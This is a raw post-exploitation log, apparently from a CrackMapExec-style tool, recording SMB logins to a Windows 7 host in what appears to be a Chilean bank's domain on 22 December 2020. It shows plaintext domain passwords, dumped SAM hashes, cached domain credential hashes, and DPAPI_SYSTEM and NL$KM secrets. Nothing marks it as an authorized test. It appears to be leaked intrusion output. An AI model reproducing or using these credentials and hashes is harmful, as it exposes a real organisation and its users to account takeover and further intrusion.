12-22-2020 18:56:04 [*] KTHXBYE
12-22-2020 18:57:48 [*] PRODVIRTUAL053.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL053) (domain:ITAUCHILE)
12-22-2020 18:57:49 [+] PRODVIRTUAL053.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:57:54 [+] PRODVIRTUAL053.ITAUCHILE.CL:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
12-22-2020 18:57:59 eaglebkb:500:aad3b435b51404eeaad3b435b51404ee:aaed397ad919533a07e2bc6aa0a151b5:::
12-22-2020 18:58:01 Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
12-22-2020 18:58:02 lcladmin:1003:aad3b435b51404eeaad3b435b51404ee:5b2f29482a2094e254265c3417966e78:::
12-22-2020 18:58:05 robotics:1004:aad3b435b51404eeaad3b435b51404ee:f17d46d33d3df6ac166148f9749b4ef0:::
12-22-2020 19:00:46 [*] PRODVIRTUAL053.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL053) (domain:ITAUCHILE)
12-22-2020 19:00:46 [+] PRODVIRTUAL053.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 19:00:51 [+] PRODVIRTUAL053.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 19:00:56 CRPA3000:c5e2b82545a761d13f76eca13b9696bd:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:57 EEAA4651:b2cd74ce8c9bffc27b152272de867141:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:58 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:01:01 ITAUCHILE\PRODVIRTUAL053$:aad3b435b51404eeaad3b435b51404ee:2ed359c1f02176fd27f45a4b8d7464b1:::
12-22-2020 19:01:03 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 19:01:04 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 21:08:24 [*] PRODVIRTUAL053.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PRODVIRTUAL053) (domain:ITAUCHILE)
12-22-2020 21:08:24 [+] PRODVIRTUAL053.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 21:08:29 [+] PRODVIRTUAL053.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 21:08:33 CRPA3000:c5e2b82545a761d13f76eca13b9696bd:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:34 EEAA4651:b2cd74ce8c9bffc27b152272de867141:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:35 CRPA0240:757c424e309989b08005df3e2151bcb9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:38 ITAUCHILE\PRODVIRTUAL053$:aad3b435b51404eeaad3b435b51404ee:2ed359c1f02176fd27f45a4b8d7464b1:::
12-22-2020 21:08:40 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 21:08:42 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
